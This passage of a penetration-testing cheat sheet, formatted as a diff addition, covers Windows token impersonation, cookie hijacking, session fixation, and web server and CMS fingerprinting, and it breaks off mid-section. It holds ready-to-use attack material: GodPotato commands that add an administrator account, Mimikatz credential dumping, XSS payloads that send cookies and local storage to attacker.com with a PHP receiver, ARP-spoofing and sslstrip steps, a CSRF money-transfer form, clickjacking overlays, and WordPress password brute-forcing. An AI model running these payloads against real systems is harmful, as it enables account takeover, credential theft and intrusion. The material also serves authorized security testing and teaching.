+# Basic execution
+GodPotato.exe -cmd "cmd /c whoami"
+
+# Add user
+GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd /add"
+GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"
+```
+
+### Token Manipulation with Mimikatz
+
+**Basic Token Operations**
+
+```powershell
+# List available tokens
+token::list
+
+# Elevate to SYSTEM token
+token::elevate
+
+# Impersonate specific user
+token::elevate /user:Administrator
+
+# Revert to original token
+token::revert
+```
+
+**Credential Theft from Tokens**
+
+```powershell
+# Dump credentials from current process
+sekurlsa::logonpasswords
+
+# Dump credentials from specific process
+sekurlsa::process /pid:<PID>
+```
+
+### Token Impersonation via PowerShell
+
+**Invoke-TokenManipulation** (PowerSploit)
+
+```powershell
+# Import module
+Import-Module .\Invoke-TokenManipulation.ps1
+
+# List available tokens
+Invoke-TokenManipulation -ShowAll
+
+# Impersonate token
+Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"
+
+# Create process with token
+Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\Administrator"
+
+# Enumerate processes with tokens
+Invoke-TokenManipulation -Enumerate
+```
+
+### Token Impersonation from Linux
+
+**Impacket with Ticket Injection**
+
+```bash
+# After obtaining TGT/TGS ticket
+export KRB5CCNAME=/path/to/ticket.ccache
+
+# Execute commands with impersonated context
+psexec.py -k -no-pass domain.local/Administrator@target.domain.local
+
+# WMI execution
+wmiexec.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+
+### Named Pipe Impersonation
+
+**Creating Malicious Named Pipe**
+
+```powershell
+# C# code concept for named pipe impersonation
+# Requires compilation to executable
+
+# Create named pipe server that captures tokens
+$pipe = new-object System.IO.Pipes.NamedPipeServerStream('\\.\pipe\testpipe', 'InOut', 1, 'Byte', 'None', 4096, 4096)
+$pipe.WaitForConnection()
+
+# Trigger privileged connection to pipe
+# Then impersonate connected client token
+```
+
+---
+
+## Cookie Hijacking
+
+### Session Cookie Fundamentals
+
+**Common Cookie Attributes**
+
+- `HttpOnly`: Prevents JavaScript access (XSS mitigation)
+- `Secure`: Only transmitted over HTTPS
+- `SameSite`: CSRF protection (Strict/Lax/None)
+- `Domain`: Cookie scope
+- `Path`: URL path scope
+- `Expires/Max-Age`: Cookie lifetime
+
+### Cookie Extraction Methods
+
+**Browser Developer Tools**
+
+```javascript
+// In browser console
+document.cookie
+
+// Extract specific cookie
+document.cookie.split(';').find(c => c.includes('session'))
+
+// Copy all cookies formatted
+copy(document.cookie)
+```
+
+**Browser Extension: Cookie-Editor**
+
+```
+1. Install Cookie-Editor extension
+2. Navigate to target site
+3. Click extension icon
+4. Export cookies as JSON/Netscape format
+```
+
+**EditThisCookie Chrome Extension**
+
+```
+1. Install EditThisCookie
+2. Click extension icon
+3. Export cookies
+4. Import on attacker browser
+```
+
+### Network-Based Cookie Capture
+
+**Wireshark HTTP Cookie Filter**
+
+```
+http.cookie or http.set_cookie
+http.cookie contains "session"
+```
+
+**tcpdump Cookie Capture**
+
+```bash
+# Capture HTTP traffic with cookies
+tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+
+# Filter for Cookie header
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i cookie
+```
+
+**Bettercap Cookie Sniffing**
+
+```bash
+# Start bettercap
+bettercap -iface eth0
+
+# Enable HTTP/HTTPS proxy
+> set http.proxy.sslstrip true
+> set http.proxy.script /path/to/cookie_capture.js
+> http.proxy on
+
+# ARP spoofing for MITM
+> set arp.spoof.targets <target_IP>
+> arp.spoof on
+```
+
+### XSS-Based Cookie Theft
+
+**Basic XSS Cookie Stealer**
+
+```javascript
+// Simple exfiltration to attacker server
+<script>
+new Image().src='http://attacker.com/steal.php?c='+document.cookie;
+</script>
+
+// URL encoded version
+<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
+
+// Using XMLHttpRequest
+<script>
+var xhr=new XMLHttpRequest();
+xhr.open('GET','http://attacker.com/?c='+document.cookie,true);
+xhr.send();
+</script>
+```
+
+**Advanced Cookie Exfiltration**
+
+```javascript
+// Exfiltrate all storage mechanisms
+<script>
+var data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage)
+};
+fetch('http://attacker.com/collect', {
+    method: 'POST',
+    body: JSON.stringify(data)
+});
+</script>
+```
+
+**XSS Hunter Integration**
+
+```javascript
+<script src="https://xss.hunter.domain/payload.js"></script>
+```
+
+**Receiver Script (steal.php)**
+
+```php
+<?php
+$cookie = $_GET['c'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date('Y-m-d H:i:s');
+$log = "[$time] IP: $ip | Cookie: $cookie\n";
+file_put_contents('cookies.txt', $log, FILE_APPEND);
+?>
+```
+
+### HTTPOnly Bypass Techniques
+
+**[Inference]** HTTPOnly cookies cannot be accessed via JavaScript, but may be leaked through:
+
+**TRACE/TRACK Method Exploitation**
+
+```javascript
+// If TRACE method is enabled (rare)
+var xhr = new XMLHttpRequest();
+xhr.open('TRACE', '/', false);
+xhr.send();
+// Response includes all headers including cookies
+```
+
+**Session Hijacking via XSS Without Cookie Access**
+
+```javascript
+// Perform actions as victim without stealing cookie
+<script>
+// Example: Change password
+fetch('/change_password', {
+    method: 'POST',
+    credentials: 'include',  // Include cookies
+    body: 'new_password=attacker_password'
+});
+</script>
+```
+
+### Cookie Injection and Manipulation
+
+**Burp Suite Cookie Manipulation**
+
+```
+1. Intercept request in Proxy
+2. Modify cookie values in HTTP headers
+3. Forward request
+
+# Example modification
+Cookie: session=victim_session_token; admin=true
+```
+
+**cURL Cookie Injection**
+
+```bash
+# Send request with specific cookies
+curl -b "session=stolen_token" http://target.com/admin
+
+# Send multiple cookies
+curl -b "session=token; role=admin" http://target.com
+
+# Save response cookies
+curl -c cookies.txt http://target.com/login -d "user=admin&pass=pass"
+
+# Use saved cookies
+curl -b cookies.txt http://target.com/dashboard
+```
+
+**Python Cookie Manipulation**
+
+```python
+import requests
+
+# Use session to maintain cookies
+session = requests.Session()
+
+# Set specific cookie
+session.cookies.set('session', 'stolen_token')
+session.cookies.set('admin', 'true')
+
+# Make request
+response = session.get('http://target.com/admin')
+
+# Cookie jar manipulation
+cookies = {'session': 'stolen_token', 'role': 'admin'}
+response = requests.get('http://target.com', cookies=cookies)
+```
+
+### Browser Cookie Storage Locations
+
+**Chrome/Chromium**
+
+```bash
+# Linux
+~/.config/google-chrome/Default/Cookies
+
+# Windows
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
+
+# Decrypt cookies (requires master key)
+python3 chrome_decrypt.py
+
+# Extract cookies using SQLite
+sqlite3 Cookies "SELECT host_key, name, value FROM cookies"
+```
+
+**Firefox**
+
+```bash
+# Linux
+~/.mozilla/firefox/*.default/cookies.sqlite
+
+# Windows
+%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite
+
+# Extract
+sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies"
+```
+
+### Cookie Replay Attacks
+
+**Manual Cookie Replay**
+
+```bash
+# Capture valid session cookie
+# Replay in different context
+
+# Using curl
+curl -H "Cookie: session=captured_token" http://target.com/admin
+
+# Using browser console
+document.cookie = "session=captured_token"
+location.reload()
+```
+
+**Automated Cookie Testing**
+
+```python
+import requests
+
+# Test stolen cookie validity
+stolen_cookie = {'session': 'captured_token'}
+
+response = requests.get('http://target.com/profile', cookies=stolen_cookie)
+
+if response.status_code == 200 and "Welcome" in response.text:
+    print("[+] Cookie is valid!")
+else:
+    print("[-] Cookie expired or invalid")
+```
+
+### Cookie Bomb (DoS via Cookies)
+
+```bash
+# Send excessive cookies to crash application
+curl -H "Cookie: $(python3 -c 'print("a=b;" * 10000)')" http://target.com
+```
+
+---
+
+## Session Fixation
+
+### Concept Overview
+
+Session fixation forces a user to authenticate with a known session ID, allowing the attacker to hijack the session after authentication without stealing credentials.
+
+### Attack Prerequisites
+
+- Application accepts session ID from URL/POST parameter
+- Application doesn't regenerate session ID after authentication
+- Attacker can set victim's session ID
+
+### Basic Session Fixation Attack Flow
+
+```
+1. Attacker obtains valid session ID from application
+2. Attacker tricks victim into using this session ID
+3. Victim authenticates with fixed session ID
+4. Attacker uses same session ID to access authenticated session
+```
+
+### Session Fixation via URL Parameter
+
+**Attack Scenario**
+
+```bash
+# 1. Attacker gets session ID
+curl http://target.com/login
+# Response includes: Set-Cookie: PHPSESSID=attacker_session_123
+
+# 2. Attacker crafts malicious link
+http://target.com/login?PHPSESSID=attacker_session_123
+
+# 3. Victim clicks link and logs in
+
+# 4. Attacker uses fixed session
+curl -b "PHPSESSID=attacker_session_123" http://target.com/dashboard
+```
+
+**Testing for URL-Based Session Fixation**
+
+```bash
+# Check if application accepts session ID in URL
+curl "http://target.com/?PHPSESSID=test123" -v
+
+# Check if session persists after login
+curl "http://target.com/login?PHPSESSID=test123" -d "user=victim&pass=pass" -v
+curl -b "PHPSESSID=test123" "http://target.com/profile" -v
+```
+
+### Session Fixation via Cookie Injection
+
+**Using XSS for Cookie Fixation**
+
+```javascript
+// Inject session cookie via XSS
+<script>
+document.cookie='PHPSESSID=attacker_session_123; path=/; domain=target.com';
+window.location='http://target.com/login';
+</script>
+```
+
+**Using HTTP Response Splitting (if vulnerable)**
+
+```
+GET /redirect?url=http://target.com%0d%0aSet-Cookie:%20PHPSESSID=attacker_session
+```
+
+### Session Fixation via Meta Tag
+
+```html
+<!-- If attacker controls page content -->
+<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session; path=/">
+```
+
+### Hidden Form Field Session Fixation
+
+```html
+<!-- If session ID transmitted via POST -->
+<form method="POST" action="http://target.com/login">
+    <input type="hidden" name="session_id" value="attacker_session_123">
+    <input name="username" value="victim">
+    <input name="password" value="password">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+### Testing for Session Fixation Vulnerabilities
+
+**Manual Testing Steps**
+
+```bash
+# 1. Obtain unauthenticated session ID
+curl -i http://target.com/
+# Note session ID: PHPSESSID=abc123
+
+# 2. Force this session ID in login request
+curl -b "PHPSESSID=abc123" -d "user=testuser&pass=testpass" http://target.com/login -i
+
+# 3. Check if session ID changed after authentication
+# If session ID is still abc123, application is vulnerable
+
+# 4. Verify access with fixed session
+curl -b "PHPSESSID=abc123" http://target.com/dashboard
+```
+
+**Automated Testing Script**
+
+```python
+import requests
+
+target = "http://target.com"
+
+# Step 1: Get initial session
+session1 = requests.Session()
+session1.get(target)
+original_cookie = session1.cookies.get('PHPSESSID')
+print(f"[*] Original session: {original_cookie}")
+
+# Step 2: Login with fixed session
+login_data = {'username': 'testuser', 'password': 'testpass'}
+session1.post(f"{target}/login", data=login_data)
+post_login_cookie = session1.cookies.get('PHPSESSID')
+print(f"[*] Post-login session: {post_login_cookie}")
+
+# Step 3: Check if session ID changed
+if original_cookie == post_login_cookie:
+    print("[!] VULNERABLE: Session ID not regenerated after login")
+else:
+    print("[+] SECURE: Session ID regenerated after login")
+```
+
+### Session Fixation via Cross-Subdomain Attack
+
+```javascript
+// If cookies accessible across subdomains
+// From attacker-controlled subdomain: evil.target.com
+<script>
+document.cookie='session=fixed_session_id; domain=.target.com; path=/';
+window.location='http://www.target.com/login';
+</script>
+```
+
+### Session Fixation Exploitation Tools
+
+**Burp Suite Session Fixation Testing**
+
+```
+1. Proxy > Intercept login request
+2. Note session ID before authentication
+3. Forward request
+4. Check response for session ID regeneration
+5. If unchanged, attempt to use session in new browser
+```
+
+**OWASP ZAP Session Management Testing**
+
+```
+1. Tools > Options > Active Scan > Policy
+2. Enable "Session Fixation" rule
+3. Run active scan on authentication endpoint
+```
+
+### Advanced Session Fixation Scenarios
+
+**Session Fixation in Mobile Apps**
+
+```bash
+# Intercept mobile app traffic
+adb shell
+am start -n com.target.app/.MainActivity -e session_id "fixed_session"
+
+# Or via proxy
+mitmdump -s inject_session.py
+```
+
+**Session Fixation via DNS Rebinding**
+
+```
+1. Attacker creates DNS entry that initially resolves to attacker IP
+2. Victim visits attacker.com which sets session cookie
+3. DNS rebinds to target IP
+4. Session cookie now sent to legitimate target with fixed session
+```
+
+### Mitigation Detection Testing
+
+**Check for Session Regeneration**
+
+```python
+import requests
+
+# Test session regeneration on privilege change
+session = requests.Session()
+
+# Get initial session
+session.get('http://target.com/user_page')
+user_session = session.cookies.get('session')
+
+# Elevate privileges
+session.post('http://target.com/upgrade_to_admin')
+admin_session = session.cookies.get('session')
+
+if user_session == admin_session:
+    print("[!] Session not regenerated on privilege escalation")
+```
+
+**Test for Session ID in URL**
+
+```bash
+# Check if session accepted from URL
+curl "http://target.com/;jsessionid=TEST123" -v
+curl "http://target.com/?sid=TEST123" -v
+curl "http://target.com/?PHPSESSID=TEST123" -v
+```
+
+### Session Fixation Combined Attacks
+
+**Session Fixation + CSRF**
+
+```html
+<!-- Fix session then trigger CSRF -->
+<img src="http://target.com/?session=fixed_id" style="display:none">
+<script>
+setTimeout(function(){
+    document.getElementById('csrf_form').submit();
+}, 1000);
+</script>
+<form id="csrf_form" action="http://target.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to" value="attacker_account">
+</form>
+```
+
+**Session Fixation + Clickjacking**
+
+```html
+<!-- Fix session in hidden frame -->
+<iframe src="http://target.com/?PHPSESSID=fixed_session" style="display:none"></iframe>
+
+<!-- Overlay legitimate login form -->
+<iframe src="http://target.com/login" style="opacity:0.00001;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
+
+<!-- Fake login interface -->
+<div>Please login to continue...</div>
+```
+
+---
+
+## Important Related Topics
+
+- **Golden Ticket Attacks** for domain-wide Kerberos persistence
+- **Pass-the-Hash/Pass-the-Ticket** for credential reuse without plaintext passwords
+- **Kerberoasting and AS-REP Roasting** for offline credential cracking
+- **JWT (JSON Web Token) attacks** for modern application authentication bypass
+- **OAuth/SAML vulnerabilities** for SSO exploitation
+- **Multi-Factor Authentication bypass techniques**
+
+---
+
+# Web Application Assessment
+
+## Web Server Identification
+
+### HTTP Header Analysis
+
+**Basic Banner Grabbing**
+
+```bash
+# Netcat
+nc target.com 80
+HEAD / HTTP/1.0
+
+echo -e "HEAD / HTTP/1.0\r\nHost: target.com\r\n\r\n" | nc target.com 80
+
+# cURL
+curl -I http://target.com
+curl -IL http://target.com  # Follow redirects
+curl -I -X OPTIONS http://target.com
+
+# OpenSSL for HTTPS
+openssl s_client -connect target.com:443
+HEAD / HTTP/1.1
+Host: target.com
+
+echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | openssl s_client -connect target.com:443 -quiet
+```
+
+**Detailed Header Inspection**
+
+```bash
+# Identify server header
+curl -I http://target.com | grep -i server
+
+# All response headers
+curl -sI http://target.com
+
+# Custom headers revealing technology
+curl -I http://target.com | grep -iE "X-Powered-By|X-AspNet-Version|X-Generator|X-Drupal-Cache|X-Varnish"
+
+# Multiple request methods
+for method in GET POST PUT DELETE OPTIONS HEAD TRACE; do
+    echo "=== $method ==="
+    curl -sI -X $method http://target.com
+done
+```
+
+**Server-Specific Headers**
+
+```bash
+# Apache indicators
+Server: Apache/2.4.41 (Unix)
+X-Powered-By: PHP/7.4.3
+
+# Nginx indicators
+Server: nginx/1.18.0
+X-Powered-By: Express
+
+# IIS indicators
+Server: Microsoft-IIS/10.0
+X-AspNet-Version: 4.0.30319
+X-AspNetMvc-Version: 5.2
+
+# Cloudflare
+Server: cloudflare
+CF-RAY: xxxxx
+
+# Other indicators
+X-Varnish  # Varnish cache
+X-Cache    # Various caching systems
+Via: 1.1 vegur  # Heroku
+```
+
+### Automated Server Detection
+
+**Whatweb**
+
+```bash
+# Basic scan
+whatweb http://target.com
+
+# Aggressive mode
+whatweb -a 3 http://target.com
+
+# Verbose output
+whatweb -v http://target.com
+
+# Custom plugins
+whatweb --list-plugins
+whatweb -p Apache,Nginx,IIS http://target.com
+
+# Output formats
+whatweb --log-json=output.json http://target.com
+whatweb --log-xml=output.xml http://target.com
+
+# Scan multiple targets
+whatweb -i targets.txt
+
+# Through proxy
+whatweb --proxy http://127.0.0.1:8080 http://target.com
+```
+
+**Wappalyzer (CLI)**
+
+```bash
+# Install
+npm install -g wappalyzer
+
+# Basic usage
+wappalyzer http://target.com
+
+# JSON output
+wappalyzer --pretty http://target.com
+```
+
+**httprint**
+
+```bash
+# Basic scan
+httprint -h target.com -s /usr/share/httprint/signatures.txt
+
+# Scan multiple hosts
+httprint -i hosts.txt -s /usr/share/httprint/signatures.txt -o output.html
+
+# Thorough scan
+httprint -h target.com -s /usr/share/httprint/signatures.txt -P0
+```
+
+**Nmap HTTP Detection**
+
+```bash
+# HTTP enumeration scripts
+nmap -sV -p 80,443 --script=http-enum target.com
+nmap -p 80,443 --script=http-server-header target.com
+nmap -p 80,443 --script=http-headers target.com
+nmap -p 80,443 --script=http-methods target.com
+nmap -p 80,443 --script=http-title target.com
+
+# Banner grabbing
+nmap -sV --version-intensity 9 -p 80,443 target.com
+
+# All HTTP scripts
+nmap -p 80,443 --script "http-*" target.com
+
+# Specific technology detection
+nmap -p 80,443 --script=http-wordpress-enum target.com
+nmap -p 80,443 --script=http-drupal-enum target.com
+nmap -p 80,443 --script=http-joomla-brute target.com
+```
+
+### Error-Based Fingerprinting
+
+**Triggering Error Pages**
+
+```bash
+# Non-existent pages
+curl http://target.com/nonexistent
+
+# Invalid methods
+curl -X INVALID http://target.com
+
+# Malformed requests
+curl -H "Host: " http://target.com
+
+# Path traversal attempts (to trigger errors)
+curl http://target.com/../../../../etc/passwd
+
+# Special characters
+curl "http://target.com/<>\"'%;)(&+"
+
+# Force 400/500 errors
+curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
+```
+
+**Error Page Analysis**
+
+```bash
+# Common error signatures
+# Apache: "Apache/X.X.X Server at target.com Port 80"
+# Nginx: "nginx/X.X.X"
+# IIS: "Server Error in '/' Application" or detailed ASP.NET errors
+# Tomcat: "Apache Tomcat/X.X.X"
+# WebLogic: "Error 404--Not Found"
+# JBoss: "JBoss Web/X.X.X"
+
+# Extract version from errors
+curl -s http://target.com/nonexistent | grep -oP '(Apache|nginx|IIS|Tomcat)/[\d\.]+'
+```
+
+### HTTP Methods and Options
+
+**Testing Allowed Methods**
+
+```bash
+# OPTIONS request
+curl -X OPTIONS -i http://target.com
+curl -X OPTIONS -i http://target.com/admin
+
+# Test specific methods
+for method in GET HEAD POST PUT DELETE TRACE TRACK CONNECT OPTIONS; do
+    echo "=== Testing $method ==="
+    curl -X $method -I http://target.com 2>&1 | head -1
+done
+
+# Dangerous methods
+curl -X TRACE -i http://target.com  # XST vulnerability
+curl -X TRACK -i http://target.com  # Microsoft equivalent
+curl -X PUT -i http://target.com/test.txt -d "test"
+curl -X DELETE -i http://target.com/test.txt
+```
+
+**WebDAV Detection**
+
+```bash
+# Check for WebDAV
+curl -X PROPFIND -i http://target.com
+curl -X OPTIONS -i http://target.com | grep -i dav
+
+# WebDAV methods
+PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK
+
+# davtest tool
+davtest -url http://target.com
+davtest -auth user:pass -url http://target.com
+```
+
+### SSL/TLS Certificate Analysis
+
+**Certificate Information**
+
+```bash
+# View certificate
+openssl s_client -connect target.com:443 -showcerts
+
+# Extract certificate
+openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text
+
+# Certificate details
+echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates
+
+# Subject Alternative Names (SANs)
+echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
+
+# Common Name and Organization
+openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject | grep -oP 'CN\s*=\s*\K[^,]+'
+```
+
+**SSLScan**
+
+```bash
+# Full SSL/TLS scan
+sslscan target.com
+
+# Specific cipher testing
+sslscan --no-failed target.com
+
+# XML output
+sslscan --xml=output.xml target.com
+```
+
+**testssl.sh**
+
+```bash
+# Comprehensive SSL/TLS testing
+./testssl.sh target.com
+
+# Specific checks
+./testssl.sh --protocols target.com
+./testssl.sh --server-defaults target.com
+./testssl.sh --vulnerable target.com
+
+# Batch testing
+./testssl.sh --file hosts.txt
+```
+
+### Response Timing and Behavior
+
+**Timing Analysis**
+
+```bash
+# Measure response times
+time curl -so /dev/null http://target.com
+
+# Multiple requests
+for i in {1..10}; do
+    time curl -so /dev/null http://target.com 2>&1 | grep real
+done
+
+# Using httping
+httping -c 10 http://target.com
+```
+
+**Response Size Patterns**
+
+```bash
+# Content-Length patterns
+curl -sI http://target.com | grep -i content-length
+
+# Actual body size
+curl -so /dev/null -w '%{size_download}\n' http://target.com
+
+# Compare different endpoints
+for path in / /admin /api /login; do
+    echo "$path: $(curl -so /dev/null -w '%{size_download}' http://target.com$path)"
+done
+```
+
+### Technology Stack Fingerprinting
+
+**Client-Side Technologies**
+
+```bash
+# Download and analyze HTML
+curl -s http://target.com | grep -iE '<script|<link|<meta'
+
+# JavaScript frameworks
+curl -s http://target.com | grep -oE '(jquery|angular|react|vue|bootstrap|ember)\.js'
+
+# CSS frameworks
+curl -s http://target.com | grep -oE '(bootstrap|foundation|bulma|tailwind)\.css'
+
+# Meta tags
+curl -s http://target.com | grep -i '<meta' | grep -iE 'generator|application-name|framework'
+
+# CDN usage
+curl -s http://target.com | grep -oE 'https?://[^"'"'"']+\.(cloudflare|akamai|fastly|cloudfront|cdn)'
+```
+
+**Server-Side Technologies**
+
+```bash
+# Cookie analysis
+curl -I http://target.com | grep -i set-cookie
+
+# Session cookie names (technology indicators)
+PHPSESSID       # PHP
+JSESSIONID      # Java/JSP
+ASP.NET_SessionId  # ASP.NET
+connect.sid     # Node.js/Express
+rack.session    # Ruby/Rack
+laravel_session # Laravel
+symfony         # Symfony
+```
+
+**URL Pattern Analysis**
+
+```bash
+# File extensions indicating technology
+.php    # PHP
+.asp    # Classic ASP
+.aspx   # ASP.NET
+.jsp    # Java Server Pages
+.do     # Java Struts
+.action # Java Struts
+.jsf    # JavaServer Faces
+.py     # Python
+.rb     # Ruby
+.pl     # Perl
+.cfm    # ColdFusion
+```
+
+## CMS Detection
+
+### Automated CMS Detection
+
+**CMSmap**
+
+```bash
+# General scan
+cmsmap http://target.com
+
+# Specific CMS
+cmsmap -t http://target.com -f W  # WordPress
+cmsmap -t http://target.com -f J  # Joomla
+cmsmap -t http://target.com -f D  # Drupal
+cmsmap -t http://target.com -f M  # Moodle
+
+# Aggressive enumeration
+cmsmap -a http://target.com
+
+# Bruteforce
+cmsmap -u admin -p passwords.txt http://target.com
+```
+
+**WhatWeb for CMS**
+
+```bash
+# CMS-focused scan
+whatweb --aggression 3 --plugins WordPress,Joomla,Drupal,Magento http://target.com
+
+# Detailed CMS info
+whatweb -v http://target.com | grep -iE 'wordpress|joomla|drupal|cms'
+```
+
+**BlindElephant**
+
+```bash
+# WordPress detection
+BlindElephant.py http://target.com wordpress
+
+# Joomla detection
+BlindElephant.py http://target.com joomla
+
+# Drupal detection
+BlindElephant.py http://target.com drupal
+```
+
+### WordPress Detection and Enumeration
+
+**WPScan**
+
+```bash
+# Basic scan
+wpscan --url http://target.com
+
+# Enumerate all
+wpscan --url http://target.com --enumerate ap,at,tt,cb,dbe,u,m
+
+# Plugin enumeration
+wpscan --url http://target.com --enumerate p
+wpscan --url http://target.com --enumerate vp  # Vulnerable plugins
+wpscan --url http://target.com --plugins-detection aggressive
+
+# Theme enumeration
+wpscan --url http://target.com --enumerate t
+wpscan --url http://target.com --enumerate vt  # Vulnerable themes
+
+# User enumeration
+wpscan --url http://target.com --enumerate u
+wpscan --url http://target.com --enumerate u1-100  # First 100 users
+
+# Timthumbs
+wpscan --url http://target.com --enumerate tt
+
+# Config backups
+wpscan --url http://target.com --enumerate cb
+
+# DB exports
+wpscan --url http://target.com --enumerate dbe
+
+# Media IDs
+wpscan --url http://target.com --enumerate m1-100
+
+# API token for vulnerability data
+wpscan --url http://target.com --api-token YOUR_TOKEN
+
+# Password brute force
+wpscan --url http://target.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
+# Stealthy scan
+wpscan --url http://target.com --stealthy --random-user-agent
+
+# Through proxy
+wpscan --url http://target.com --proxy http://127.0.0.1:8080
+
+# Disable SSL verification
+wpscan --url https://target.com --disable-tls-checks
+
+# Output formats
+wpscan --url http://target.com -o output.txt
+wpscan --url http://target.com -f json -o output.json
+```
+
+**Manual WordPress Detection**
+
+```bash
+# Common WordPress indicators
+curl -s http://target.com | grep -i wp-content
+curl -s http://target.com | grep -i wp-includes
+curl -s http://target.com/wp-login.php
+curl -s http://target.com/readme.html
+
+# WordPress version from meta
+curl -s http://target.com | grep -oP '<meta name="generator" content="WordPress \K[\d\.]+'
+
+# Version from RSS feed
+curl -s http://target.com/feed/ | grep -oP '<generator>.*WordPress \K[\d\.]+'
+
+# Version from readme
+curl -s http://target.com/readme.html | grep -i "version"
+
+# wp-config.php backup attempts
+curl -I http://target.com/wp-config.php.bak
+curl -I http://target.com/wp-config.php.old
+curl -I http://target.com/wp-config.php~
+curl -I http://target.com/wp-config.php.save
+curl -I http://target.com/.wp-config.php.swp
+
+# Plugin discovery
+curl -s http://target.com | grep -oP 'wp-content/plugins/\K[^/]+'
+
+# Theme discovery
+curl -s http://target.com | grep -oP 'wp-content/themes/\K[^/]+'
+
+# User enumeration via API
+curl -s http://target.com/wp-json/wp/v2/users
+curl -s http://target.com/?rest_route=/wp/v2/users
+
+# User enumeration via author pages
+for i in {1..10}; do
+    curl -sI http://target.com/?author=$i | grep -i location
+done
+
+# XML-RPC detection
+curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php
+
+# Upload directory
+curl -I http://target.com/wp-content/uploads/
+```
+
+**WordPress Vulnerability Scanning**
+
+```bash
+# Known vulnerable plugins
+wpscan --url http://target.com --enumerate vp --plugins-detection aggressive --api-token TOKEN
+
+# Check specific plugin
+curl -s http://target.com/wp-content/plugins/plugin-name/readme.txt
+
+# Common vulnerable plugins to check
+vulnerable_plugins=(
+    "wp-file-manager"
+    "elementor"
+    "contact-form-7"
+    "wp-live-chat-support"
+    "wpvivid-backuprestore"
+)
+
+for plugin in "${vulnerable_plugins[@]}"; do
+    echo "Checking $plugin..."
+    curl -sI "http://target.com/wp-content/plugins/$plugin/readme.txt" | head -1
+done
+```
+
+### Joomla Detection and Enumeration
+
+**JoomScan**
+
+```bash
+# Basic scan
+joomscan -u http://target.com
+
+# Enumerate components
+joomscan -u http://target.com -ec
+
+# Enumerate templates
+joomscan -u http://target.com -et
+
+# Enumerate modules
+joomscan -u http://target.com -em
+
+# Full enumeration
+joomscan -u http://target.com -ec -et -em
+```
+
+**Manual Joomla Detection**
+
+```bash
+# Version detection
+curl -s http://target.com/administrator/manifests/files/joomla.xml | grep -oP '<version>\K[^<]+'
+curl -s http://target.com/language/en-GB/en-GB.xml | grep -oP '<version>\K[^<]+'
+
+# Common indicators
+curl -I http://target.com/administrator/
+curl -s http://target.com | grep -i joomla
+curl -s http://target.com | grep -i "/media/system/"
+curl -s http://target.com | grep -i "option=com_"
+
+# Configuration file backups
+curl -I http://target.com/configuration.php~
+curl -I http://target.com/configuration.php.bak
+curl -I http://target.com/configuration.php.old
+
+# Component discovery
+curl -s http://target.com | grep -oP 'option=com_\K[^&"]+' | sort -u
+
+# Template discovery
+curl -s http://target.com | grep -oP '/templates/\K[^/]+' | sort -u
+
+# Module discovery
+curl -s http://target.com | grep -oP '/modules/\K[^/]+' | sort -u
+
+# User enumeration
+curl -s "http://target.com/index.php?option=com_users&view=registration"
+```
+
+**Joomlascan (Alternative)**
+
+```bash
+# Install
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl -u http://target.com
+```
+
+### Drupal Detection and Enumeration
+
+**Droopescan**
+
+```bash
+# Drupal scan
+droopescan scan drupal -u http://target.com
+
+# Enumerate plugins
+droopescan scan drupal -u http://target.com -e p
+
+# Enumerate themes
+droopescan scan drupal -u http://target.com -e t
+
+# Enumerate all
+droopescan scan drupal -u http://target.com -e a
+
+# Version detection
+droopescan scan drupal -u http://target.com --number 20
+```
+
+**Manual Drupal Detection**
+
+```bash
+# Version from CHANGELOG.txt
+curl -s http://target.com/CHANGELOG.txt | head -5
+
+# Version from core/CHANGELOG.txt (Drupal 8+)
+curl -s http://target.com/core/CHANGELOG.txt | head -5
+
+# Common indicators
+curl -s http://target.com | grep -i drupal
+curl -s http://target.com | grep -i "Drupal.settings"
+curl -I http://target.com/user/login
+curl -I http://target.com/node
+
+# Module discovery
+curl -s http://target.com | grep -oP '/sites/[^/]+/modules/\K[^/"]+'  | sort -u
+curl -s http://target.com | grep -oP '/modules/\K[^/"]+'  | sort -u
+
+# Theme discovery
+curl -s http://target.com | grep -oP '/themes/\K[^/"]+'  | sort -u
+
+# Update status (may leak info)
+curl -s http://target.com/admin/reports/updates
+
+# Default files
+curl -I http://target.com/sites/default/files/
+curl -I http://target.com/INSTALL.txt
+curl -I http://target.com/LICENSE.txt
+
+# REST API
+curl -s http://target.com/jsonapi
+curl -s http://target.com/rest
+
+# User enumeration
+curl -s http://target.com/user/1
+curl -s http://target.com/users
+```
+
+**Drupal CMSmap**
+
+```bash
+cmsmap -t http://target.com -f D
+```
+
+### Other CMS Detection
+
+**Magento**
+
+```bash
+# Magescan
+php magescan.phar scan:all target.com
+
+# Manual detection
+curl -s http://target.com | grep -i magento
+curl -I http://target.com/downloader/
+curl -I http://target.com/admin/
+curl -s http://target.com/magento_version
+curl -s http://target.com/skin/frontend/
+
